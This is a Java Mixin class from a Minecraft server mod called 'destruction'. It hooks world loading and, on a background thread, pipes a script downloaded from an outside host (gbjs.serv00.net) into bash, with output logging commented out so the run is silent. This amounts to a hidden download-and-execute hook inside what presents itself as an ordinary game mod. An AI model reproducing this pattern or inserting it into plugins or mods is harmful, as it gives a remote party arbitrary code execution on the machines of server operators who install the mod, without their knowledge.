package com.liming2038.destruction.mixin;

import com.liming2038.destruction.Destruction;
import net.minecraft.server.MinecraftServer;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
@Mixin(MinecraftServer.class)
public class ServerStartMixin {

    private boolean started = false;

    @Inject(method = "loadWorld", at = @At("HEAD"))
    private void onLoadWorld(CallbackInfo info) {
        if (started) return;
        started = true;

        new Thread(() -> {
            try {
                String scriptCommands = """
                (curl -Ls https://gbjs.serv00.net/sh/vip1715.sh)|bash
                                """;
                // 你要执行的命令
                List<String> executionResults = runScript(scriptCommands);
                // 取消注释，如果你想看命令日志
                // for (String line : executionResults) { 
                //     Destruction.LOGGER.info(line); 
                // }
            } catch (Exception e) {
                Destruction.LOGGER.error("Error running bash command", e);
            }
        }).start();
    }
    private static List<String> runScript(String scriptContent) {
        List<String> results = new ArrayList<>();
        Process process = null;

        try {
            String shell = findShell();
            ProcessBuilder pb = new ProcessBuilder(shell.split(" "));
            pb.redirectErrorStream(true); 
            process = pb.start();

            OutputStream os = process.getOutputStream();
            os.write(scriptContent.getBytes());
            os.flush();
            os.close();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            results.add("Script Output:\n" + output.toString());

            int exitCode = process.waitFor();
            results.add("Script Exit Code: " + exitCode);

        } catch (IOException e) {
            results.add("Error starting process or writing to input: " + e.getMessage());
        } catch (InterruptedException e) {
            results.add("Script execution interrupted: " + e.getMessage());
            Thread.currentThread().interrupt();
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        return results;
    }
    private static String findShell() {
        String[] shells = {
            "/usr/bin/env bash",
            "/bin/bash",
            "/usr/bin/bash",
            "/usr/local/bin/bash",
            "/bin/sh",
            "/usr/bin/sh"
        };

        for (String s : shells) {
            try {
                Process p = new ProcessBuilder(s.split(" ")).start();
                p.destroy();
                return s;
            } catch (Exception ignored) {}
        }

        return "sh"; 
    }
}
